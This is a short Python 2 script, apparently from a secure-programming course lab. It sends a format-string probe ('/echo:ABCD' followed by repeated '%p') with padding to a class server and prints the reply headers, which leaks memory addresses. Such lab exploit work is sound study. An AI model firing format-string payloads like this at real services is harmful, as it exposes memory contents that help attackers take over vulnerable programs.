#!/usr/bin/python

import socket
import pdb
# pdb.set_trace()

URL = 'secprog.cs.nctu.edu.tw'
PORT = 10032
CRLF = "\r\n"

    #"1234 /echo:ABCD%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p",
request = [
        "1234567890123456789012345678901234567 /echo:ABCD%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p",
    ""
]

# Connect to the server
s = socket.socket()
s.connect((URL, PORT))

# Send an HTTP request
s.send(CRLF.join(request))

# Get the response (in several parts, if necessary)
response = ''
buffer = s.recv(4096)
while buffer:
    response += buffer
    buffer = s.recv(4096)

# HTTP headers will be separated from the body by an empty line
header_data, _, body = response.partition(CRLF + CRLF)

print header_data
